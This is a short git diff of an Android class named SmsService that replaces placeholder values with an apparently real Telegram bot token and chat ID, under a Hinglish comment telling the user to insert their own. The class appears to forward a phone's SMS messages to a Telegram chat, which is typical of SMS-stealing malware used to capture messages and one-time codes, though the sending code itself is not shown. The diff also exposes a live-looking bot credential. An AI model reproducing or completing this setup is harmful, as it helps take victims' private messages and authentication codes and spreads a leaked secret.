@@ -22,8 +22,8 @@ import java.util.Locale;
 public class SmsService extends Service {
 
     // ====== YAHAN APNA TOKEN AUR CHAT ID DAALO ======
-    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-    private static final String CHAT_ID = "YOUR_CHAT_ID_HERE";
+    private static final String BOT_TOKEN = "8755444402:AAHMnXZp0cY60w8HC-bkr_Ut_VNKALeY6Es";
+    private static final String CHAT_ID = "8623638607";
     // ================================================
 
     private boolean oldSmsSent = false;
